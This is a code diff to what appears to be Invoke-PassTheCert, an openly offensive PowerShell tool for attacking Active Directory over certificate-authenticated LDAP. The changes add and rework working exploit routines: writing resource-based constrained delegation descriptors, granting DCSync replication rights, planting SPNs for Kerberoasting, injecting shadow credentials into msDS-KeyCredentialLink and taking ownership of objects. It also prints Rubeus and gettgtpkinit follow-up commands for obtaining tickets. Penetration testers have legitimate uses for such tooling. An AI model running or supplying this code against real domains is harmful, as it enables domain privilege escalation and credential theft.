-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-AllowedToDelegateTo=*)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-AllowedToDelegateTo=*)' |Select distinguishedName,objectsid,sAMAccountName,useraccountcontrol,objectcategory,msds-allowedtodelegateto |fl
         }
 
-        "WritePrincipal" {
-            $ResultObjects = @()
+        'RBCD' {
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' |Select distinguishedName,objectsid,sAMAccountName,useraccountcontrol,objectcategory,msds-allowedtoactonbehalfofotheridentity |fl
+        }
 
+        'WritePrincipal' {
+            $ResultObjects = @()
             _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=person)' |%{ 
                 $TargetObject = $_; 
                 $ResultObjects += _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $TargetObject.distinguishedName |?{
@@ -10531,15 +10597,11 @@ function _LDAPEnum {
                     Add-Member -PassThru -Force -NotePropertyName 'Target' -NotePropertyValue $TargetObject.distinguishedname
                 }
             }
-            
             return $ResultObjects |%{ $_ |Add-Member -Force -NotePropertyName 'SecurityIdentifierDN' -NotePropertyValue (_Filter -LdapConnection $LdapConnection -SearchBase (_Helper-GetDomainDNFromDN -DN (_GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection)) -SearchScope 'Subtree' -SIDFilter $_.SecurityIdentifier |Select -ExpandProperty distinguishedName); $_}
-
         }
 
         'DCSync' {
-            
             $ResultObjects = @()
-            
             _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope Subtree -Properties * -LDAPFilter '(objectCategory=domain)' |%{
                 $TargetDomain = $_; 
                 $ResultObjects += _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $TargetDomain.distinguishedName |?{
@@ -10547,9 +10609,7 @@ function _LDAPEnum {
                     Add-Member -PassThru -Force -NotePropertyName 'Target' -NotePropertyValue $TargetDomain.distinguishedname
                 }
             }
-            
             return $ResultObjects |%{ $_ |Add-Member -Force -NotePropertyName 'SecurityIdentifierDN' -NotePropertyValue (_Filter -LdapConnection $LdapConnection -SearchBase (_Helper-GetDomainDNFromDN -DN (_GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection)) -SearchScope 'Subtree' -SIDFilter $_.SecurityIdentifier |Select -ExpandProperty distinguishedName); $_}
-
         }
 
         'PassPol' {
@@ -10561,14 +10621,14 @@ function _LDAPEnum {
 
         'All' {
             # Executing only the enumeration modules with the strict minimum number of mandatory parameters. For instance, we won't run OUMembers, or GroupMembers, as they require a specific parameter.
-            foreach ($Enum in @('Kerberoasting', 'ASREPRoasting', 'Descriptions', 'Users', 'Computers', 'Groups', 'DCs', 'OUs', 'Sites', 'GPOs', 'GPLinks', 'Printers', 'admins', 'LogonScripts', 'CAs', 'CertificateTemplates', 'DAs', 'gMSAs', 'sMSAs', 'LAPS', 'MAQ', 'RootDSE', 'OSs', 'Trusts', 'ShadowCreds', 'Unconstrained', 'Constrained', 'DCSync', 'PassPol')) {
+            foreach ($Enum in @('RootDSE', 'DCs', 'admins', 'DAs', 'Groups', 'Descriptions', 'Users', 'Computers', 'OSs', 'MAQ', 'LAPS', 'OUs', 'Sites', 'GPOs', 'GPLinks', 'Printers', 'LogonScripts', 'CAs', 'CertificateTemplates', 'gMSAs', 'sMSAs', 'Trusts', 'DONT_EXPIRE_PASSWORD', 'PASSWD_NOTREQD', 'Kerberoasting', 'ASREPRoasting', 'ShadowCreds', 'Unconstrained', 'Constrained', 'RBCD', 'DCSync', 'PassPol')) {
                 _LDAPEnum -LdapConnection $LdapConnection -Enum $Enum -SearchBase $SearchBase -SearchScope $SearchScope |fl
             }
         }
 
         'GroupMembers' {
 
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($Name))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($Name))) { Write-Host "[*$Enum*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
             
             $Results = @() 
             
@@ -10579,7 +10639,7 @@ function _LDAPEnum {
 
             # Grabbing each value within the 'member' array attribute of the group. 
             # Each of these is a principal's distinguishedname, being either a `User`, `Computer`, `Group`, `OU`, or `Contact`.
-            # The recursive logic relies on groups objects ONLY !
+            # The recursive logic relies on group objects ONLY !
             $Result |?{ $_.objectcategory -eq "CN=Group,$($RootDSE.schemanamingcontext)"} |%{
                 # True whenever a group is within a group, false otherwise (hence STOP of the recursive nested group lookup)
                 $Results += _LDAPEnum -LdapConnection $LdapConnection -Enum 'GroupMembers' -Name $_.cn
@@ -10589,22 +10649,25 @@ function _LDAPEnum {
         }
 
         'OUMembers' {
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($Name))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($Name))) { Write-Host "[*$Enum*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
             # Not using the OU's DN as a base for search (e.g. 'OU=Unity,DC=X') allows to prevent the user to provide the OU's DN. Instead, the user may only specify 'Unity', Quicky'n'Handy.
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope |?{ $_.distinguishedName -like "*,OU=$Name,*" } |Select distinguishedName,sAMAccountName,userAccountControlNames,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope |?{ $_.distinguishedName -like "*,OU=$Name,*" } |Select distinguishedName,sAMAccountName,useraccountcontrol,objectcategory
         }
 
         'Owner' {
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($ObjectDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($ObjectDN))) { Write-Host "[*$Enum*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
-            return (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute 'nTSecurityDescriptor').Owner.Value
+            $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -SIDFilter (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute 'nTSecurityDescriptor').Owner.Value
+
+            return $Result |Select distinguishedName,objectSid |fl
         }
 
         'Creator' {
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($ObjectDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($ObjectDN))) { Write-Host "[*$Enum*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
-            $CreatorSIDBytes = [byte[]](_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute 'mS-DS-CreatorSID')
-            return (New-Object System.Security.Principal.SecurityIdentifier($CreatorSIDBytes, 0)).Value
+            $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -SIDFilter (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute 'mS-DS-CreatorSID')
+
+            return $Result |Select distinguishedName,objectSid |fl
         }
 
         Default { Write-Host "[!] LDAP Enumeration '$Enum' Not Recognized !"; return }
@@ -10650,12 +10713,6 @@ function _LDAPExploit {
 
         .EXAMPLE
 
-            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'RBCD' -IdentityDN 'CN=Wanha WD. DELHEG,CN=Users,DC=X' -TargetDN 'CN=COMPUTATOR,CN=Computers,DC=X'
-
-            Grants the principal `Wanha WD. DELHEG` Read/Write privileges against the `CN=COMPUTATOR,CN=Computers,DC=X`:`msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
-
-        .EXAMPLE
-
             _LDAPExploit -LdapConnection $LdapConnection -Exploit 'ShadowCreds' -TargetDN 'CN=John JD. DOE,CN=Users,DC=X'
 
             Populates the targeted account `CN=John JD. DOE,CN=Users,DC=X`:`msDS-KeyCredentialLink` attribute with a new self-signed certificate.
@@ -10669,6 +10726,14 @@ function _LDAPExploit {
             Sets the owner of `Kinda KO. OWNED` to the entity with SID `S-1-1-0`. In other words, `Everyone` becomes the owner of `Kinda KO. OWNED`.
 
             - This requires WRITE privileges against the target's `nTSecurityDescriptor` attribute
+
+        .EXAMPLE
+
+            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'RBCD' -IdentityDN 'CN=WANHADELHEG,CN=Computers,DC=X' -TargetDN 'CN=RBESEEDEE,CN=Computers,DC=X'
+
+            Populates the targeted computer `RBESEEDEE$`:`msDS-AllowedToActOnBehalfOfOtherIdentity` attribute with the `WANHADELHEG$` account's SID. In other words, `RBESEEDEE$` is trusting `WANHADELHEG$` to act on behalf of any identity.
+
+            - This requires WRITE privileges against the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
 
         .LINK
 
@@ -10704,50 +10769,41 @@ function _LDAPExploit {
 
         'Kerberoasting' {
             
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
             if (-not $SPN) { $SPN = "$(_Helper-GetRandomString -Length 4 -Charset 'abcdefghijklmnopqrstuvwxyz')/$(_Helper-GetRandomString -Length 8 -Charset 'abcdefghijklmnopqrstuvwxyz')" }
             
-            Write-Verbose "[*$Exploit*] Trying To Add SPN '$SPN' Into The '$TargetDN':'serviceprincipalname' Attribute..."
+            Write-Verbose "[*$Exploit*] [*] Trying To Add SPN '$SPN' Into The '$TargetDN':'serviceprincipalname' Attribute..."
             
-            _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN $TargetDN -Attribute 'serviceprincipalname' -Value $SPN
+            _AddValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'serviceprincipalname' -Value $SPN
 
-            Write-Host "[*$Exploit*] Successfully Added SPN '$SPN' Into The '$TargetDN':'serviceprincipalname' Attribute !!"
+            Write-Host "[*$Exploit*] [+] Successfully Added SPN '$SPN' Into The '$TargetDN':'serviceprincipalname' Attribute !!"
 
         }
 
         "DCSync" {
             
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
             # Defaults to the LDAP/S Server's Domain
             if (-not $TargetDN) { $TargetDN = $(_Helper-GetDomainDNFromDN $(_GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection)) }
             
-            Write-Verbose "[*$Exploit*] Trying To Grant '$IdentityDN' DCSync Rights Over Domain '$(_Helper-GetDomainNameFromDN $TargetDN)'..."
+            Write-Verbose "[*$Exploit*] [*] Granting '$IdentityDN' DCSync Rights Over Domain '$(_Helper-GetDomainNameFromDN $TargetDN)'..."
 
             # Grant the right if not already present
             _CreateInboundACE -LdapConnection $LdapConnection -IdentityDN $IdentityDN -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightName 'DS-Replication-Get-Changes' -TargetDN $TargetDN
             _CreateInboundACE -LdapConnection $LdapConnection -IdentityDN $IdentityDN -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightName 'DS-Replication-Get-Changes-All' -TargetDN $TargetDN
 
-            Write-Host "[*$Exploit*] Successfully Granted '$IdentityDN' DCSync Rights Over Domain '$(_Helper-GetDomainNameFromDN -DN $TargetDN)' !!";
-
-        }
-
-        "RBCD" {
-            
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
-
-            Write-Verbose "[*$Exploit*] Granting SDDL ACE Rights 'ReadProperty, WriteProperty' To '$IdentityDN' Against '$TargetDN':'msDS-AllowedToActOnBehalfOfOtherIdentity'..."
-
-            _CreateInboundSDDL -LdapConnection $LdapConnection -IdentityDN $IdentityDN -TargetDN $TargetDN -Attribute 'msDS-AllowedToActOnBehalfOfOtherIdentity' -SDDLACEType 'OA' -SDDLACERights 'RPWP'
-
-            Write-Host "[*$Exploit*] Successfully Provided SDDL Rights 'ReadProperty, WriteProperty' To '$IdentityDN' Against '$TargetDN':'msDS-AllowedToActOnBehalfOfOtherIdentity' !!";
+            Write-Host "[*$Exploit*] [+] Successfully Granted '$IdentityDN' DCSync Rights Over Domain '$(_Helper-GetDomainNameFromDN -DN $TargetDN)' !!";
+            Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'DCSync'"
 
         }
         
         "ShadowCreds" {
             
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+
+            Write-Verbose "[*$Exploit*] [*] Populating '$TargetDN':'msDS-KeyCredentialLink' Attribute With A New Self-Signed Certificate..."
 
             try {
 
@@ -10846,18 +10902,19 @@ function _LDAPExploit {
                 $DNWithBinary = "B:$($Hex.Length):$($Hex):$TargetDN"
                 
                 # 5. Populate !
-                _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN $TargetDN -Attribute 'msDS-KeyCredentialLink' -Value $DNWithBinary
+                _AddValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'msDS-KeyCredentialLink' -Value $DNWithBinary
 
+                Write-Host "[*$Exploit*] [+] Successfully Populated '$TargetDN':'msDS-KeyCredentialLink' Attribute With A New Self-Signed Certificate !!"
                 Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'ShadowCreds'"
-                Write-Host "[*$Exploit*] [Authenticate] gettgtpkinit.py -dc-ip <dc_ip> -cert-pfx '$sAMAccountName.pfx' -pfx-pass '' $(_Helper-GetDomainNameFromDN -DN $TargetDN)/'$sAMAccountName' './out.ccache'"
-                Write-Host "[*$Exploit*] [Authenticate] Rubeus.exe asktgt /dc:<dc_ip> /user:'$sAMAccountName' /certificate:'$sAMAccountName.pfx' /password:'' /domain:$(_Helper-GetDomainNameFromDN -DN $TargetDN) /nowrap"
+                Write-Host "[*$Exploit*] [Exploit] gettgtpkinit.py -dc-ip <dc_ip> -cert-pfx '$sAMAccountName.pfx' -pfx-pass '' $(_Helper-GetDomainNameFromDN -DN $TargetDN)/'$sAMAccountName' './out.ccache'"
+                Write-Host "[*$Exploit*] [Exploit] Rubeus.exe asktgt /dc:<dc_ip> /domain:$(_Helper-GetDomainNameFromDN -DN $TargetDN) /user:'$sAMAccountName' /certificate:'$sAMAccountName.pfx' /password:'' /nowrap"
 
 
             } catch { 
 
                 Write-Host "[*$Exploit*] [!] Exploitation Failed With Error: $_"; 
-                Write-Host "[*$Exploit*] [*] Hint: Do You Have Write Privileges Against The '$TargetDN':'msDS-KeyCredentialLink' Attribute ? If Not, You May Execute (If Allowded):"
-                Write-Host "[*$Exploit*] [Grant] Invoke-PassTheCert -Action 'CreateInboundSDDL' -LdapConnection `$LdapConnection -Identity '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)' -Target '$TargetDN' -Attribute 'msDS-KeyCredentialLink' -SDDLACEType 'OA' -SDDLACERights 'RPWP'"
+                Write-Host "[*$Exploit*] [*] Hint: Do You Have Write Privileges Against The '$TargetDN':'msDS-KeyCredentialLink' Attribute ? If Not, You May Execute (If Allowed):"
+                Write-Host "[*$Exploit*] [Fix] Invoke-PassTheCert -Action 'CreateInboundSDDL' -LdapConnection `$LdapConnection -Identity '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)' -Target '$TargetDN' -Attribute 'msDS-KeyCredentialLink' -SDDLACEType 'OA' -SDDLACERights 'RPWP'"
                 return
 
             }
@@ -10866,12 +10923,12 @@ function _LDAPExploit {
 
         "Owner" {
             
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($OwnerSID, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($OwnerSID, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
-            Write-Verbose "[*$Exploit*] Setting '$OwnerSID' As Owner Of Target '$TargetDN'..."
+            Write-Verbose "[*$Exploit*] [*] Setting '$OwnerSID' As Owner Of Target '$TargetDN'..."
             
             # Locally editing the target's nTSecurityDescriptor's owner
-            $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'nTSecurityDescriptor'
+            $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'nTSecurityDescriptor' -Raw
             $SD.Owner = [System.Security.Principal.SecurityIdentifier]::new(
                 $OwnerSID
             )
@@ -10896,6 +10953,35 @@ function _LDAPExploit {
 
             Write-Host "[*$Exploit*] [+] Successfully Set '$OwnerSID' As Owner Of Target '$TargetDN' !"
             Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'Owner' -Object '$TargetDN'"
+
+        }
+
+        "RBCD" {
+            
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+
+            Write-Verbose "[*$Exploit*] [*] Setting '$TargetDN':'msDS-AllowedToActOnBehalfOfOtherIdentity' Attribute To SID Of '$IdentityDN'..."
+
+            try {
+
+                $IdentitySID = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'objectSid'
+                $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$IdentitySID)"
+                $SDBytes = New-Object byte[] ($SD.BinaryLength)
+                $SD.GetBinaryForm($SDBytes, 0)
+
+                _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Value $SDBytes
+
+                Write-Host "[*$Exploit*] [+] Successfully Set '$TargetDN':'msDS-AllowedToActOnBehalfOfOtherIdentity' Attribute To SID Of '$IdentityDN' !!"
+                Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'RBCD'"
+
+            } catch {
+
+                Write-Host "[*$Exploit*] [!] Exploitation Failed With Error: $_"; 
+                Write-Host "[*$Exploit*] [*] Hint: Do You Have Write Privileges Against The '$TargetDN':'msDS-AllowedToActOnBehalfOfOtherIdentity' Attribute ? If Not, You May Execute (If Allowed):"
+                Write-Host "[*$Exploit*] [Fix] Invoke-PassTheCert -Action 'CreateInboundSDDL' -LdapConnection `$LdapConnection -Identity '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)' -Target '$TargetDN' -Attribute 'msDS-AllowedToActOnBehalfOfOtherIdentity' -SDDLACEType 'OA' -SDDLACERights 'RPWP'"
+                return
+
+            }
 
         }
 
@@ -11322,8 +11408,6 @@ function Invoke-PassTheCert {
                 - You MAY export that LDAP Connection Instance into a passwordless/password-protected certificate; for instance:
                     PS > Get-Help Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -Full
                     PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.pfx' -ExportContentType 'pfx'
-                    PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.pfx' -ExportContentType 'pfx' -ExportPassword 'ExP0rTP@sssw0Rd123!'
-                    PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12'
                     PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12' -ExportPassword 'ExP0rTP@sssw0Rd123!'
 
 
@@ -11342,9 +11426,9 @@ function Invoke-PassTheCert {
             [5] Enjoy ! For instance (you MAY add `-Verbose`):
                 
                 PS > $DumpLdap = Invoke-PassTheCert -Action 'Filter' -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -LDAPFilter '(objectClass=*)'
-                PS > $DumpLdap |?{$_.sAMAccountName -ne $null -and ($_.useraccountcontrolnames -like '*WORKSTATION_TRUST_ACCOUNT*' -or $_.useraccountcontrolnames -like '*NORMAL_ACCOUNT*')} |Select-Object sAMAccountName,description,useraccountcontrolnames,distinguishedname,serviceprincipalname |fl
+                PS > $DumpLdap |?{$_.sAMAccountName -ne $null -and ($_.useraccountcontrol -like '*WORKSTATION_TRUST_ACCOUNT*' -or $_.useraccountcontrol -like '*NORMAL_ACCOUNT*')} |Select-Object sAMAccountName,description,useraccountcontrol,distinguishedname,serviceprincipalname |fl
                 
-                PS > $DumpInboundACLsWrite = Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection $LdapConnection -ObjectDN 'CN=Kinda KU. USY,CN=Users,DC=X'
+                PS > $DumpInboundACLsWrite = Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection $LdapConnection -Object 'CN=Kinda KU. USY,CN=Users,DC=X'
                 PS > $DumpInboundACLsWrite |?{ $_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*GenericWrite*' -or $_.AccessMaskNames -ilike '*WriteProperty*' -or $_.AccessMaskNames -ilike '*WriteDACL*') -and $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{3,}' }
 
                 PS > Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'DCSync'
@@ -11759,16 +11843,16 @@ function Invoke-PassTheCert {
                 $Result = _UpdatePasswordOfIdentity -LdapConnection $LdapConnection -IdentityDN $IdentityDN -NewPassword $NewPassword;
             }
             "OverwriteValueInAttribute" { 
-                $Result = _OverwriteValueInAttribute -LdapConnection $LdapConnection -IdentityDN $IdentityDN -Attribute $Attribute -Value $Value;
+                $Result = _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute $Attribute -Value $Value;
             }
             "AddValueInAttribute" { 
-                $Result = _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN $IdentityDN -Attribute $Attribute -Value $Value;
+                $Result = _AddValueInAttribute -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute $Attribute -Value $Value;
             }
             "RemoveValueInAttribute" { 
-                $Result = _RemoveValueInAttribute -LdapConnection $LdapConnection -IdentityDN $IdentityDN -Attribute $Attribute -Value $Value;
+                $Result = _RemoveValueInAttribute -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute $Attribute -Value $Value;
             }
             "ClearAttribute" { 
-                $Result = _ClearAttribute -LdapConnection $LdapConnection -IdentityDN $IdentityDN -Attribute $Attribute;
+                $Result = _ClearAttribute -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute $Attribute;
             }
             "ShowStatusOfAccount" { 
                 $Result = _ShowStatusOfAccount -LdapConnection $LdapConnection -IdentityDN $IdentityDN;
